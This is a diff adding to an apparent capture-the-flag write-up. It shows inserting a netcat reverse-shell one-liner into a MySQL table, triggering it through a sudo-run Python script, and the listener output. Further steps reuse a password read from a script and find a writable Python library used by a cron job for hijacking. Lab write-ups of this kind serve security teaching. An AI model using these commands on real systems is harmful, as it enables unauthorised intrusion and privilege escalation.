@@ -161,6 +161,59 @@ It works so then we can try to input code into the MySQL database and see if the
 `use library;` to use the `library` database.  
 `show tables;` to show the tables in the selected database.  
 `select * from dreams;` to show everything from the tables.  
+`Insert into dreams (dreamer,dream) values ("test1","test2");` we can test that we can input into the columns. Use `select * from dreams;` again to check that the data was successfully inserted into the table.   
+`insert into dreams (dreamer,dream) values ("pwned","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <your_ip> <listening_port> >/tmp/f");` to insert our reverse shell to the table.   
+
+Again starting an ncat listener for the port specified in the reverse shell. Then I can execute the python script as `death`.  
+```
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+Alice + Flying in the sky
+
+Bob + Exploring ancient ruins
+
+Carol + Becoming a successful entrepreneur
+
+Dave + Becoming a professional musician
+
+test1 + test2
+
+```
+```
+ncat -lvnp 1235
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1235
+Ncat: Listening on 0.0.0.0:1235
+Ncat: Connection from 10.10.116.166:36264.
+death@dreaming:/home/lucien$
+```
+
+Now I'm in as `death` and have access to `/home/death/death_flag.txt`. I also checked the `/home/death/getDreams.py` for the MySQL password and then checked if the password is valid for the user account(it is).  
+I could not find anything other interesting in `death`s folder and then headed to `morpheus`s folder.  
+There is a Python script that backups `/home/morpheus/kingdom` to `/kingdom_backup/kingdom` and it uses `copy2` from `shutil` to do that.  
+
+I checked if the script was in a cronjob somewhere with the program called `pspy` that I uploaded to the machine.  
+The script seems to execute every minute.  
+```
+2024/01/04 12:46:01 CMD: UID=0     PID=67444  | /usr/sbin/CRON -f
+2024/01/04 12:46:01 CMD: UID=1002  PID=67445  | /usr/sbin/CRON -f
+2024/01/04 12:46:01 CMD: UID=1002  PID=67446  | /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py
+2024/01/04 12:47:01 CMD: UID=0     PID=67447  | /usr/sbin/CRON -f
+2024/01/04 12:47:01 CMD: UID=1002  PID=67448  | /usr/sbin/CRON -f
+2024/01/04 12:47:01 CMD: UID=1002  PID=67449  | /bin/sh -c /usr/bin/python3.8 /home/morpheu
+```
+
+
+shutil.py is found at `/usr/lib/python3.8/` and we seem to have permission to write to it.  
+```
+ls -la /usr/lib/python3.8/shutil.py
+-rw-rw-r-- 1 root death 51474 Aug  7 23:52 /usr/lib/python3.8/shutil.py
+```
+
+
+
+
+
+
 
 
 
